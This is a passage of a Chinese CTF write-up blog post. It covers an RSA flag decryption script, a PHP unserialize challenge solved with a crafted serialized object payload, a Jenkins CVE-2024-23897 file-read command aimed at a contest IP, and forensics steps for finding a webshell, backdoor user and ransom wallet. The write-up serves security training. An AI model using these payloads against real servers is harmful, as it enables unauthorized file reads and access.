中,</p>\n<p>可以看到已得出了 private_key.pem ，但是用 kali 自带的貌似解出来不对，</p>\n<p> 于是我用 python 写了一段解密 exp ：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> Crypto.PublicKey <span class=\"hljs-keyword\">import</span> RSA<br><span class=\"hljs-keyword\">from</span> Crypto.Cipher <span class=\"hljs-keyword\">import</span> PKCS1_OAEP<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">dec</span>():<br>\tprivate_key = RSA.importKey(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&#x27;private.pem&#x27;</span>, <span class=\"hljs-string\">&#x27;r&#x27;</span>).read())<br> \trsa_decryptor = PKCS1_OAEP.new(private_key)<br> \t<span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&#x27;flag.enc&#x27;</span>, <span class=\"hljs-string\">&#x27;rb&#x27;</span>) <span class=\"hljs-keyword\">as</span> fp:<br> \t\tencrypted_data = fp.read()<br> \tdecrypted = rsa_decryptor.decrypt(encrypted_data)<br> \t<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;解密后的 flag:&quot;</span>, decrypted.decode())<br>dec()<br></code></pre></td></tr></table></figure>\n\n<p>得出 flag </p>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h3 id=\"unser\"><a href=\"#unser\" class=\"headerlink\" title=\"unser\"></a>unser</h3><hr>\n<p>题目描述：小李是一位初学编程的小伙子，刚接触一种新语言。他发现这门语言操作数据的方式很特 别，可以把复杂的信息转化为看似简单的文本，又能轻松恢复成原来的样子。 为了练习，他写了一个小程序，记录好友的名字和生日。小李把这些信息转换成一个奇怪的格式保存起 来。几天后，他用程序还原了这些数据，发现好友的生日一条不少。他很开心，觉得自己迈出了学习的 第一步。 这次成功让小李充满信心，他开始觉得学编程并没有想象中那么难嘛！ </p>\n<hr>\n<p> 得到题目实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php+HTML\">&lt;?php<br>highlight_file(__FILE__);<br>include(&quot;flag.php&quot;);<br>class login&#123;<br>\tpublic $user;<br> \tpublic $pass;<br> \tfunction __construct($user,$pass)&#123;<br> \t\t$this-&gt;user=$user;<br> \t\t$this-&gt;pass=$pass;<br> \t&#125;<br> \tfunction login()&#123;<br> \t\tif ($this-&gt;user==&quot;admin&quot; and $this-&gt;pass==&quot;admin123&quot;)&#123;<br> \t\t\treturn True;<br> \t\t&#125;<br> \t&#125;<br>&#125;<br><br>if(isset($_GET[&#x27;flag&#x27;]))<br>&#123;<br>\t$a=unserialize($_GET[&#x27;flag&#x27;]);<br>\tif($a-&gt;login())<br>\t&#123;<br>\t\techo $flag;<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p> 经典的反序列化漏洞， 写一手逆向代码，</p>\n<p>得到payload ：<strong>O:5:”login”:2: {s:4:”user”;s:5:”admin”;s:4:”pass”;s:8:”admin123”;}</strong> </p>\n<p>得到 flag </p>\n<h3 id=\"Jenkins\"><a href=\"#Jenkins\" class=\"headerlink\" title=\"Jenkins\"></a>Jenkins</h3><hr>\n<p>题目描述：坏了，我不会 java ，这怎么打？？？ </p>\n<p>hint: 容器启动较慢，请耐心等候，完全启动预计需要 10min flag 位于 &#x2F;flag </p>\n<p>在网上看看有没有现成的 poc 之类的？</p>\n<hr>\n<p>等网页加载完后是经典的登陆界面，利用网络资源有 poc ，</p>\n<p>首先在前端页面输入 <strong>jnlpJars&#x2F;jenkins-cli.jar</strong> ，可以下载到 jar 文件， </p>\n<p>然后再打开 kali ，在命令行中输入：<strong>java -jar ‘&#x2F;..&#x2F;..&#x2F;..&#x2F;jenkins-cli.jar -s -http 47.121.201.96:50527 help 1 “@&#x2F;flag’’</strong> </p>\n<p>得到 flag </p>\n<p>#参考了 <a href=\"https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html\">Jenkins 文件读取漏洞拾遗（ CVE-2024-23897 ） | 离别歌</a> </p>\n<h1 id=\"Forensics-（附件忘了保存了-）\"><a href=\"#Forensics-（附件忘了保存了-）\" class=\"headerlink\" title=\"Forensics （附件忘了保存了 :( ）\"></a>Forensics （附件忘了保存了 :( ）</h1><h3 id=\"应急响应-1-钓鱼邮件\"><a href=\"#应急响应-1-钓鱼邮件\" class=\"headerlink\" title=\"应急响应 -1 钓鱼邮件\"></a>应急响应 -1 钓鱼邮件</h3><hr>\n<p>近日， Peng 的个人电脑遭到黑客攻击，请你帮 Peng 溯源攻击链。 黑客发送的钓鱼邮件的发件地址是？</p>\n<p> 例： XAUTCTF{ <a href=\"mailto:&#49;&#x32;&#51;&#x34;&#53;&#54;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;\">123456@qq.com</a>} </p>\n<p>hint ：部分文件为真实病毒样本，请不要在物理机运行 </p>\n<p>翻一翻 <code>此电脑 </code></p>\n<hr>\n<p>挂载虚拟机后进入，</p>\n<p> 根据提示，点击此电脑，有一个寒假通知，点击后即可看到邮件地址。 </p>\n<h3 id=\"应急响应-2-一句话木马\"><a href=\"#应急响应-2-一句话木马\" class=\"headerlink\" title=\"应急响应 -2 一句话木马\"></a>应急响应 -2 一句话木马</h3><hr>\n<p>题目描述：黑客写入的一句话木马的连接密码是？ </p>\n<p>例： XAUTCTF{cmd} </p>\n<hr>\n<p>在虚拟机上下载 D盾，查找后门文件可以看到有两个可疑文件， </p>\n<p>点开可以看到一句话马 🐎 ，得到是 POST 的easyshell ，为 flag </p>\n<h3 id=\"应急响应-3-后门用户\"><a href=\"#应急响应-3-后门用户\" class=\"headerlink\" title=\"应急响应 -3 后门用户\"></a>应急响应 -3 后门用户</h3><hr>\n<p>题目描述：黑客的添加的后门用户是？ </p>\n<p>例： XAUTCTF{hacker} </p>\n<hr>\n<p>在虚拟机上的控制面板的用户账户可得到后门用户 wshcaker$ </p>\n<h3 id=\"应急响应-4-病毒文件\"><a href=\"#应急响应-4-病毒文件\" class=\"headerlink\" title=\"应急响应 -4 病毒文件\"></a>应急响应 -4 病毒文件</h3><hr>\n<p>题目描述：黑客植入的病毒程序的外连 ip 及端口是 </p>\n<hr>\n<p>在cmd 里输入 netstat -naob 可得到外连 IP 地址 </p>\n<h3 id=\"应急响应-5-勒索钱包\"><a href=\"#应急响应-5-勒索钱包\" class=\"headerlink\" title=\"应急响应 -5 勒索钱包\"></a>应急响应 -5 勒索钱包</h3><hr>\n<p>题目描述：黑客留下的勒索钱包地址是？ </p>\n<p>例： XAUTCTF{1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa} </p>\n<hr>\n<p>直接点击桌面上的 readme.txt 可得到</p>\n<!--more-->","categories":[{"name":"CTF相关","slug":"CTF相关","count":7,"path":"api/categories/CTF相关.json"}],"tags":[{"name":"比赛个人WP","slug":"比赛个人WP","count":2,"path":"api/tags/比赛个人WP.json"}]}